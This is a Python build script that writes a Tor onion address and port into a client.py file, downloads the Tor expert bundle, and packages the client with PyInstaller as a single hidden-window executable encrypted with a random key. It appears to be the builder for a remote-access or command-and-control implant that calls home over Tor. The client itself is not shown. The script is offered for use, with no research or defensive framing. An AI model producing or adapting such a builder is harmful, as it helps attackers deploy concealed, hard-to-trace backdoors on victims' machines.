import PyInstaller.__main__
import requests
import os
import zipfile
import commandLineArgs
import random
import string


def getTorExpertBundle():
	# create directory for the tor expert bundle
	os.mkdir('torbundle')
	os.chdir('torbundle')
	
	# download tor expert bundle
	torURL = 'https://www.torproject.org/dist/torbrowser/10.0.7/tor-win32-0.4.4.6.zip'
	fileData = requests.get(torURL, allow_redirects=True)
	with open('tor.zip', 'wb') as file:
		file.write(fileData.content)
	
	# unzip tor expert bundle
	with zipfile.ZipFile('tor.zip') as file:
		file.extractall('.')
	
	# remove zip file
	if os.path.isfile('tor.zip'):
		os.remove('tor.zip')

	# change directory back to \client
	os.chdir('..')


if __name__ == '__main__':
	onion, port = commandLineArgs.parse()
	# replace the onion and port line in client.py,
	# since if havent found a more elegant way to do this yet.
	lines = open('client.py').read().splitlines()
	# onion address is defined in line 6
	lines[5] = 'onion = "{}"'.format(onion)
	# onion port is defined in line 7
	lines[6] = 'port = {}'.format(port)
	# write modified script to file
	open('client.py','w').write('\n'.join(lines))
	# dont download everytime
	if not os.path.isdir('torbundle'):
		getTorExpertBundle()
	
	# generate "random" obfuscation key
	charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
	obfusc_key = ''.join([random.choice(charset) for _ in range(20)])

	PyInstaller.__main__.run([
	    'client.py',
	    '--onefile',
	    '--noconsole',
	    '--key={}'.format(obfusc_key),
	    '--add-data=torbundle;torbundle'
	])